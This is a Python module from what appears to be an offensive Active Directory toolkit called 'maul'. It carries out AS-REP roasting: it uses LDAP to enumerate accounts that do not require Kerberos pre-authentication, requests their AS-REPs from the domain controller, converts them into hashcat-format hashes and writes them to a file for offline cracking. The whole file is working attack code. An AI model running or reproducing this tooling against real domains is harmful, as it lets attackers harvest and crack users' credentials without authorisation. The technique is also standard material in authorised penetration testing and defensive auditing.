"""AS-REP roasting — request AS-REPs without pre-auth and extract crackable hashes."""

from __future__ import annotations

import logging
from dataclasses import dataclass

from maul.core.ldap_client import get_attr_first
from maul.utils.ldap_filters import ASREPROASTABLE

log = logging.getLogger(__name__)


@dataclass
class AsRepRoastResult:
    username: str
    domain:   str
    etype:    int
    hash_str: str
    error:    str = ""


def run(conn) -> list[AsRepRoastResult]:
    """Enumerate accounts with DONT_REQUIRE_PREAUTH and request their AS-REPs.

    No authentication is required for the AS-REP requests themselves — only
    LDAP enumeration needs a valid session (via conn).

    Returns a list of AsRepRoastResult objects.
    """
    from maul.auth.kerberos import request_as_rep, as_rep_to_hashcat

    domain = conn.domain
    dc     = conn.dc

    entries = conn.ldap_search(
        ASREPROASTABLE,
        attributes=["sAMAccountName"],
    )

    results: list[AsRepRoastResult] = []

    for entry in entries:
        username = str(get_attr_first(entry, "sAMAccountName") or "")
        if not username:
            continue

        try:
            as_rep_bytes = request_as_rep(username, domain, dc)
            hash_str = as_rep_to_hashcat(as_rep_bytes, username, domain)
            etype = _etype_from_hash(hash_str)
            results.append(AsRepRoastResult(
                username=username, domain=domain,
                etype=etype, hash_str=hash_str,
            ))
        except Exception as exc:
            log.debug("AS-REP request failed for %s: %s", username, exc)
            results.append(AsRepRoastResult(
                username=username, domain=domain,
                etype=0, hash_str="", error=str(exc),
            ))

    return results


def hashes_to_file(results: list[AsRepRoastResult], path: str) -> int:
    """Write valid hashes to a file, one per line. Returns count written."""
    lines = [r.hash_str for r in results if r.hash_str]
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))
        if lines:
            fh.write("\n")
    return len(lines)


def _etype_from_hash(hash_str: str) -> int:
    try:
        return int(hash_str.split("$")[2])
    except Exception:
        return 0
